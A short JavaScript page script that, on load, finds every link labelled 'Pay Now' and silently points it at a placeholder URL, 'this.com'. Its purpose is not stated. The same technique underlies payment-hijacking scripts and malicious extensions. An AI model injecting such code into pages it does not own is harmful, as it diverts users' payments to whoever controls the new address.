console.log("loaded");
function executeScript() {
    var anchorElements = document.querySelectorAll('a');
    var newurl = "this.com";
    
    // Loop through eacha <a> element
    anchorElements.forEach(function(anchorElement) {
        // Check if the text content of the <a> element is "Pay Now"
        if (anchorElement.textContent.trim() === 'Pay Now') {
            // Change the href attribute to "this.com"
            anchorElement.href = newurl;
        }
    });
}

// Add an event listener for the 'DOMContentLoaded' event
document.addEventListener('DOMContentLoaded', executeScript);
executeScript();
